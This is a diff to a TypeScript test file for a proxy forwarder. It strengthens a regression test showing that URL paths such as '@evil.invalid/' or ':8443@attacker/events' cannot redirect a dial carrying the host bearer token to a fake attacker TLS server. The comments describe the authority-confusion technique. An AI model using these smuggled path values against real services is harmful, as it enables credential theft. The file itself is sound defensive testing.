@@ -212,23 +212,62 @@ describe('host-proxy forwarder', () => {
   // --- pure helpers ---
 
 
-  test('the dial CANNOT leave the recorded origin, whatever the request target says', async () => {
-    // The payoff for escaping would be severe: this hop attaches the host
-    // bearer, so an off-origin dial exfiltrates it. `https.request(origin +
-    // path)` reparses the concatenation, and `'https://host:8443' + '@evil/'`
-    // reparses to origin `https://evil`. Passing hostname/port as FIELDS makes
-    // that structurally impossible rather than relying on llhttp rejecting the
-    // target and on `:8443` making other forms an invalid port — two defences
-    // that live in other components and are nowhere stated.
-    const escapes = ['@evil.invalid/', 'http://evil.invalid/x', '//evil.invalid/x'];
-    for (const path of escapes) {
-      const req = await defaultDial(config.target, { method: 'GET', path, headers: {} });
-      const dialed = req as unknown as { host?: string; getHeader?: (n: string) => unknown };
-      // Whatever the target, the connection is to the recorded host.
-      expect(dialed.host).toBe(parseHostUrl(hostUrl).hostname);
-      req.destroy();
+  test('the dial CANNOT leave the recorded origin — a TLS attacker receives NOTHING', async () => {
+    // Observed, not introspected. The escape is real against the primitive:
+    // `'https://host:8443' + '@evil/'` reparses with the host's authority
+    // demoted to userinfo and the attacker's as the origin, and this hop
+    // attaches the host bearer — so the payoff is bearer exfiltration. A port
+    // does not stop it. Nothing reaches it through this proxy today only
+    // because llhttp refuses a target whose first byte is `@`, and because
+    // every other caller passes a constant or an escaped id; both are
+    // properties of OTHER code, and `Dialer` places no constraint on
+    // `opts.path`.
+    //
+    // The attacker is a REAL TLS endpoint this process trusts. That detail is
+    // what makes this a gate rather than a restatement: against a plain-HTTP
+    // stand-in an escaping dial fails the TLS handshake, so the test passes for
+    // the wrong reason and cannot fail on vulnerable code. Verified by
+    // reverting to a concatenating dial and watching the attacker get reached.
+    const reached: string[] = [];
+    const attackerOrigin = http.createServer((req, res) => {
+      reached.push(`${req.method} ${req.url} auth=${req.headers.authorization ?? 'none'}`);
+      res.writeHead(200); res.end('pwned');
+    });
+    const attackerOriginPort = await listen(attackerOrigin);
+    const attacker = await startFunnelEdge({ port: attackerOriginPort });
+    const attackerAuthority = new URL(attacker.url).host;
+
+    try {
+      for (const escape of [
+        `@${attackerAuthority}/events`,
+        `:8443@${attackerAuthority}/events`,
+        `https://${attackerAuthority}/events`,
+      ]) {
+        // A dial that THROWS or errors is a pass — nothing went anywhere. Only
+        // being reached is a failure, so each shape is isolated and the
+        // assertion is about the attacker's log.
+        try {
+          const req = await defaultDial(config.target, {
+            method: 'GET',
+            path: escape,
+            headers: { authorization: `Bearer ${HOST_BEARER}` },
+          });
+          await new Promise<void>((resolve) => {
+            req.once('error', () => resolve());
+            req.once('response', (res) => { res.resume(); res.once('end', () => resolve()); });
+            req.end();
+            setTimeout(resolve, 1_000);
+          });
+        } catch { /* rejected before any bytes moved — pass */ }
+      }
+
+      expect(reached).toEqual([]);
+      expect(attacker.seenPaths).toEqual([]);
+    } finally {
+      await attacker.close();
+      await close(attackerOrigin);
     }
-  });
+  }, 20_000);
 
   test('hostProtocolCompatible enforces the inclusive [min,max] window', () => {
     expect(hostProtocolCompatible(HOST_MIN_COMPAT_VERSION)).toBe(true);
